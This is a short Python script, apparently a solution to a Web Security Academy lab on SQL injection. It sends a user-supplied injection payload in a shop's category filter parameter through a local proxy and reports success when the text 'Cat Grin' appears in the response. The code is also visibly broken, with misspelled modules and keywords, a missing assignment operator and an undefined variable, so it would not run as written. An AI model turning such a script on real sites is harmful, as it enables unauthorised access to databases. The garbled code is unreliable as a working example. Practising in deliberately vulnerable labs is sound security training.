# Web-Academy SQL-Injection #1
import request
import sys
import urllib3
urlib3.disable_warnings(urllib3.exceptions.InssecureRequestWarning)


proxies {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1'}

def exploit_sqli(url, payload):
  uri = '/filter?category='
  r = request.get(url +uri + payload, verfiy=false, proxies=proxies)
  if "Cat Grin" in r.text:
    return True
  else:
    return False


if __name__ = "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
      print("[-] Usage: %s <url> <payload>" % sys.argv[0])
      print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
      sys.exit(-1)    
    
    if exploit_sqli(irl, payload):
      print("[+] SQL injection successful!")
    else:
      print("[-] SQL injection unsuccessful!")
